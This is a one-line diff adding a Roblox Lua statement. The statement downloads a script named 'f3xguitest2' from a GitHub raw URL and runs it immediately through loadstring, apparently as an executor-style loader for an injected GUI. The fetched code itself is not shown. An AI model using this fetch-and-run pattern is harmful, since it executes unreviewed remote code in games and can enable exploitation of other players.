@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vrmvrmilliondvouer/f3xguitest2/main/f3xguitest2"))()
